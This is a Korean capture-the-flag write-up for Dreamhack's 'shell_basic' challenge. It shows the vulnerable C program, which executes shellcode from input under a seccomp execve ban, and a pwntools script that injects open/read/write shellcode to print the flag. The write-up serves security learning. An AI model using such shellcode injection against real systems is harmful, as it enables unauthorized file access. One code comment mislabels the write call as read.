# [Shell_basic](https://dreamhack.io/wargame/challenges/410/) 

 문제 파일의 코드는 다음과 같다. 

```C
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

## Exploit strategy

처음 문제를 보았을 때는 mmap이라는 생소한 함수가 있어서 굉장히 당황스러웠다.

공부를 해서 찾아보니 문제에 적힌 코드 
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);의 뜻은 핵심만 말하자면 offset(마지막 argument 0)에서 시작해서 0x1000바이트만큼을 start주소(첫번째 argument NULL)로 맵핑한다는 의미다. PROT인자는 메모리 보호모드의 종류이다. 여기서 fd값은 -1이다. 스택오버플로우에서 찾아보니 fd 값을 -1로 하여 mmap함수를 사용하는 것은 메모리를 할당하는 방법 중의 하나라고 한다. 

유심히 봐야할 코드는 

read(0, shellcode, 0x1000);

sc = (void *)shellcode; 이다.

표준입력을 통해 shellcode의 값을 입력받고 

이 값을 함수포인터에 type casting을 하여 대입하는 것이다. 
그렇다면 함수포인터에는 shellcode의 시작주소가 담기게 될 것이기때문에 sc를 호출하는 순간 셸코드를 실행시킬 수 있는 것이다.

이 문제를 풀기위해서는 문제에서 제시한 플래그 파일을 읽어서 플래그를 획득(출력)해야한다. 
즉 우리는 orw shellcode를 삽입한 exploit script를 작성하면 된다.

## Exploit script 

다음은 해당 문제에 대한 exploit script로, 파이썬 모듈 중 pwntools를 사용하여 작성하였다. 

```python
from pwn import* 
# importing pwntools
p = remote('host1.dreamhack.games',10732) 
# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용 인자는 각각 호스트와 포트

context.arch = 'amd64' 
#공격 대상 아키텍쳐는 x86-64

path = "/home/shell_basic/flag_name_is_loooooong"
#flag 위치와 이름

code = ''

code += shellcraft.open(path,0 ,0)
#shellcraft를 이용하여 open system call의 셸코드를 사용.

code += shellcraft.read('rax','rsp',0x1000)
#shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
#fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다. 주의해야할 점은 buffer 인자로 rsp - count가 아니라 rsp 값을 대입해야한다.

code += shellcraft.write(1,'rsp',0x1000)
#shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
#인자가 read와 같다.

print(p.recv())
#출력데이터 받아서 출력.

p.sendline(asm(code)) 
#작성한 셸코드+'\n'를 기계어로 변환하여 전송 

print(p.recvuntil('}'))
#플래그 형식은 DH{...}이므로 출력데이터를 '}'가 출력될 때까지 받아서 출력. 
```
